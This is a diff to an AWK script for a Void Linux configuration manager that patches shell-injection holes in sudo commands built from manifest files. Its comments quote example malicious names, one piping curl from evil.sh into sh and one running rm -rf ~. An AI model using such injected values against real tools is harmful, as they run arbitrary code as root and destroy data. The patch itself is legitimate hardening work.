@@ -865,8 +1035,24 @@ BEGIN {
                     status = svc_parts[2]
                     gsub(/[ \t\r\n]/, "", service)
                     gsub(/[ \t\r\n]/, "", status)
-                    
-                    if (system("[ -d \"/etc/sv/" service "\" ]") != 0) {
+
+                    # КРИТИЧНО: service - строка из services.vix (обычный
+                    # текстовый файл, не полностью доверенный ввод - его можно
+                    # отредактировать вручную или импортировать из чужого
+                    # репозитория с дотфайлами). Раньше она подставлялась
+                    # НАПРЯМУЮ в 'sudo ln -s', 'sudo touch', 'sudo rm -f',
+                    # 'sudo sv stop' и даже в саму проверку существования
+                    # "[ -d /etc/sv/$service ]" - имя вида
+                    #   foo"; curl evil.sh | sh #
+                    # выполнило бы произвольные команды ОТ ROOT ещё на этапе
+                    # самой первой проверки. Валидируем строгим allowlist-ом
+                    # ДО любого использования в system().
+                    if (!is_safe_name(service)) {
+                        print "\033[31m" "  [!] Небезопасное/некорректное имя сервиса в services.vix пропущено: " line "\033[0m"
+                        continue
+                    }
+
+                    if (system("[ -d /etc/sv/" shq(service) " ]") != 0) {
                         continue
                     }
                     
@@ -881,32 +1067,32 @@ BEGIN {
                     
                     target_services[service] = resolved_status
                      
-                    has_symlink = (system("[ -L \"/var/service/" service "\" ]") == 0)
-                    has_down = (system("[ -f \"/etc/sv/" service "/down\" ]") == 0)
+                    has_symlink = (system("[ -L /var/service/" shq(service) " ]") == 0)
+                    has_down = (system("[ -f /etc/sv/" shq(service) "/down ]") == 0)
 
                     if (resolved_status == "true") {
                         if (!has_symlink || has_down) {
                             print "  [!] Изменение конфигурации -> Сервис [" service "]: Включение (true)"
-                            system("sudo rm -f \"/etc/sv/" service "/down\"")
+                            system("sudo rm -f /etc/sv/" shq(service) "/down")
                             if (!has_symlink) {
-                                system("sudo ln -s \"/etc/sv/" service "\" \"/var/service/\"")
+                                system("sudo ln -s /etc/sv/" shq(service) " /var/service/")
                             }
                         }
                     } else if (resolved_status == "false" && current_section == "var") {
                         if (!has_symlink || !has_down) {
                             print "  [!] Изменение конфигурации -> Сервис [" service "]: Ограничение автозапуска (false в var)"
-                            system("sudo touch \"/etc/sv/" service "/down\"")
+                            system("sudo touch /etc/sv/" shq(service) "/down")
                             if (!has_symlink) {
-                                system("sudo ln -s \"/etc/sv/" service "\" \"/var/service/\"")
+                                system("sudo ln -s /etc/sv/" shq(service) " /var/service/")
                             }
                         }
                     } else if (resolved_status == "false" && current_section == "etc") {
                         if (has_symlink || !has_down) {
                             print "  [!] Изменение конфигурации -> Сервис [" service "]: Отключение и утилизация симлинка (false в etc)"
-                            system("sudo touch \"/etc/sv/" service "/down\"")
+                            system("sudo touch /etc/sv/" shq(service) "/down")
                             if (has_symlink) {
-                                system("sudo rm -f \"/var/service/" service "\"")
-                                system("sudo sv stop \"" service "\" >/dev/null 2>&1")
+                                system("sudo rm -f /var/service/" shq(service))
+                                system("sudo sv stop " shq(service) " >/dev/null 2>&1")
                             }
                         }
                     }
@@ -919,11 +1105,12 @@ BEGIN {
             sv_clean_cmd = "find /var/service -maxdepth 1 -mindepth 1 -type l"
             while ((sv_clean_cmd | getline active_svc) > 0) {
                 sub(".*/", "", active_svc)
+                if (!is_safe_name(active_svc)) continue
                 if (!(active_svc in target_services)) {
                     print "  [!] Найдено расхождение -> Убираю незадекларированный сервис: " active_svc
-                    system("sudo touch \"/etc/sv/" active_svc "/down\"")
-                    system("sudo rm -f \"/var/service/" active_svc "\"")
-                    system("sudo sv stop \"" active_svc "\" >/dev/null 2>&1")
+                    system("sudo touch /etc/sv/" shq(active_svc) "/down")
+                    system("sudo rm -f /var/service/" shq(active_svc))
+                    system("sudo sv stop " shq(active_svc) " >/dev/null 2>&1")
                 }
             }
             close(sv_clean_cmd)
@@ -936,15 +1123,26 @@ BEGIN {
             print "\n--- [Шаг Г: Синхронизация репозиториев XBPS] ---"
             rep_ch = deserialize_repo_all(REPO_FILE)
 
+            repo_step_ok = 1
             if (rep_ch == 1) {
                 print "  -> Обнаружены изменения в репозиториях. Принудительно обновляю индексы XBPS..."
                 if (system("sudo xbps-install -S") != 0) {
                     print "\033[31m" "  [!] Ошибка: не удалось обновить индексы репозиториев." "\033[0m"
                     PIPELINE_HAD_ERRORS = 1
+                    repo_step_ok = 0
                 }
             } else {
                 print "  -> Изменений в репозиториях не обнаружено."
             }
+
+            # Компонент "репозитории" всегда синхронизируется обратно из
+            # фактического состояния /usr/share/xbps.d и /etc/xbps.d - в том
+            # числе и при ошибке выше, чтобы repo.vix не остался в
+            # промежуточном/поломанном виде, а отражал реально применённое.
+            if (!repo_step_ok) {
+                print "  -> Синхронизирую repo.vix с фактическим (возможно, частично применённым) состоянием..."
+            }
+            serialize_repo_all(REPO_FILE)
         }
 
         # ----------------------------------------------------
@@ -958,7 +1156,7 @@ BEGIN {
                 local_cache_cmd = "xbps-query -l | awk '{print $2}'"
                 while ((local_cache_cmd | getline l_pkg) > 0) {
                     l_pkg_clean = clean_package_name(l_pkg)
-                    if (l_pkg_clean != "") installed_packages[l_pkg_clean] = 1
+                    if (l_pkg_clean != "" && is_safe_name(l_pkg_clean)) installed_packages[l_pkg_clean] = 1
                 }
                 close(local_cache_cmd)
 
@@ -972,6 +1170,18 @@ BEGIN {
 
                     current_pkg = clean_package_name(line)
 
+                    # КРИТИЧНО: current_pkg дальше подставляется в 'sudo
+                    # xbps-install'/'sudo xbps-remove'. packages.vix - обычный
+                    # текстовый файл, который можно отредактировать вручную
+                    # или импортировать из чужого репозитория с дотфайлами -
+                    # его содержимое не является доверенным. Без этой проверки
+                    # строка вида 'vim; rm -rf ~ #' привела бы к выполнению
+                    # произвольных команд ОТ ROOT через sudo.
+                    if (current_pkg != "" && !is_safe_name(current_pkg)) {
+                        print "\033[31m" "  [!] Небезопасное/некорректное имя пакета в packages.vix пропущено: " line "\033[0m"
+                        continue
+                    }
+
                     if (current_pkg != "" && !(current_pkg in processed_packages)) {
                         processed_packages[current_pkg] = 1
                         target_packages[current_pkg] = 1
@@ -982,7 +1192,7 @@ BEGIN {
                 # Находим разницу между желаемым (манифест) и фактическим (система) состоянием
                 pkgs_to_remove = ""
                 for (p in installed_packages) {
-                    if (!(p in target_packages)) pkgs_to_remove = pkgs_to_remove " " p
+                    if (!(p in target_packages)) pkgs_to_remove = pkgs_to_remove " " shq(p)
                 }
 
                 pkgs_to_install = ""
@@ -991,14 +1201,14 @@ BEGIN {
                         # Проверяем, не удовлетворён ли пакет уже (в т.ч. виртуальный/alternatives,
                         # напр. libGL/libEGL/awk и т.п. - они не попадают в installed_packages
                         # по имени напрямую, но уже предоставлены другим установленным пакетом)
-                        already_satisfied_cmd = "xbps-query \"" p "\" >/dev/null 2>&1"
+                        already_satisfied_cmd = "xbps-query " shq(p) " >/dev/null 2>&1"
                         if (system(already_satisfied_cmd) == 0) {
                             continue
                         }
 
-                        check_repo = "xbps-query -R " p " >/dev/null 2>&1"
+                        check_repo = "xbps-query -R " shq(p) " >/dev/null 2>&1"
                         if (system(check_repo) == 0) {
-                            pkgs_to_install = pkgs_to_install " " p
+                            pkgs_to_install = pkgs_to_install " " shq(p)
                         } else {
                             print "  -> Пакет [" p "] не найден в репозиториях, пропускаю."
                         }
@@ -1026,13 +1236,21 @@ BEGIN {
                         }
                     }
 
-                    if (pkg_step_ok) {
-                        print "[Пересборка манифеста пакетов с актуальными зависимостями...]"
-                        generate_packages_config(PKG_FILE)
-                    } else {
-                        print "  -> Манифест packages.vix НЕ обновлён из-за ошибки транзакции."
-                        print "  -> При следующем запуске 'vix switch' Шаг Д повторится."
+                    if (!pkg_step_ok) {
+                        print "\033[31m" "  [!] Транзакция пакетов завершилась с ошибкой." "\033[0m"
                         PIPELINE_HAD_ERRORS = 1
+                    }
+
+                    # Компонент "пакеты" синхронизируется с фактическим
+                    # состоянием системы в любом случае (успех или ошибка) -
+                    # так manifest всегда возвращается в рабочее, реально
+                    # установленное состояние, а не остаётся с "битым" следом
+                    # от неудачной транзакции.
+                    print "[Синхронизация packages.vix с фактическим состоянием системы...]"
+                    generate_packages_config(PKG_FILE)
+                    if (!pkg_step_ok) {
+                        print "  -> packages.vix приведён в соответствие РЕАЛЬНО установленным пакетам (транзакция могла примениться частично)."
+                        print "  -> Если нужен другой набор - отредактируйте packages.vix и запустите 'vix switch' снова."
                     }
                 }
         }
@@ -1049,9 +1267,13 @@ BEGIN {
                 if (ex_eq <= 0) continue
                 ex_name = substr(ex_line, 1, ex_eq-1)
                 ex_path = substr(ex_line, ex_eq+1)
+                if (!is_safe_name(ex_name)) {
+                    print "\033[31m" "  [!] Небезопасное/некорректное имя папки в extra.vix пропущено: " ex_name "\033[0m"
+                    continue
+                }
                 ex_manifest = VOID_CONFIG "/" ex_name
 
-                if (system("[ ! -d \"" ex_manifest "\" ]") == 0) {
+                if (system("[ ! -d " shq(ex_manifest) " ]") == 0) {
                     print "  -> [" ex_name "] пропущена: нет в config.vix/, хотя зарегистрирована в extra.vix"
                     continue
                 }
@@ -1060,9 +1282,11 @@ BEGIN {
                 ex_live_h = get_dir_hash(ex_path)
                 if (ex_cur_h != ex_live_h) {
                     print "  -> Изменение обнаружено! Обновляю: " ex_path
-                    system("mkdir -p \"" ex_path "\"")
-                    system("find \"" ex_path "\" -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
-                    system("cp -a \"" ex_manifest "\"/. \"" ex_path "\"/ 2>/dev/null")
+                    make_writable(ex_path)
+                    system("mkdir -p " shq(ex_path))
+                    system("find " shq(ex_path) " -mindepth 1 -maxdepth 1 -exec rm -rf {} +")
+                    system("cp -a " shq(ex_manifest) "/. " shq(ex_path) "/ 2>/dev/null")
+                    make_writable(ex_path)
                 } else {
                     print "  -> [" ex_name "] уже соответствует манифесту, пропускаю."
                 }
@@ -1110,6 +1334,14 @@ BEGIN {
             mkdir_p(staging_dir "/dotfiles")
             system("find \"" DOTFILES "\" -mindepth 1 -maxdepth 1 -exec cp -a {} \"" staging_dir "/dotfiles/\" \\;")
 
+            # Метка машины, на которой сделан этот слепок. Нужна, чтобы на
+            # Шаге А отличить "манифест не менялся" от "config.vix целиком
+            # перенесён на другую машину, где реального состояния системы,
+            # соответствующего манифесту, попросту нет" - см. использование
+            # ниже, в вычислении skip_*.
+            print MACHINE_ID > (staging_dir "/.machine_id")
+            close(staging_dir "/.machine_id")
+
             if (system("[ -f \"" PKG_FILE "\" ]") == 0) system("cp -a \"" PKG_FILE "\" \"" staging_dir "/\"")
             if (system("[ -f \"" SVC_FILE "\" ]") == 0) system("cp -a \"" SVC_FILE "\" \"" staging_dir "/\"")
             if (system("[ -f \"" REPO_FILE "\" ]") == 0) system("cp -a \"" REPO_FILE "\" \"" staging_dir "/\"")
@@ -1122,10 +1354,11 @@ BEGIN {
                     fz_eq = index(fz_line, "=")
                     if (fz_eq <= 0) continue
                     fz_name = substr(fz_line, 1, fz_eq-1)
+                    if (!is_safe_name(fz_name)) continue
                     fz_src = VOID_CONFIG "/" fz_name
-                    if (system("[ -d \"" fz_src "\" ]") == 0) {
+                    if (system("[ -d " shq(fz_src) " ]") == 0) {
                         mkdir_p(staging_dir "/extra/" fz_name)
-                        system("cp -a \"" fz_src "\"/. \"" staging_dir "/extra/" fz_name "\"/ 2>/dev/null")
+                        system("cp -a " shq(fz_src) "/. " shq(staging_dir "/extra/" fz_name) "/ 2>/dev/null")
                     }
                 }
                 close(EXTRA_FILE)
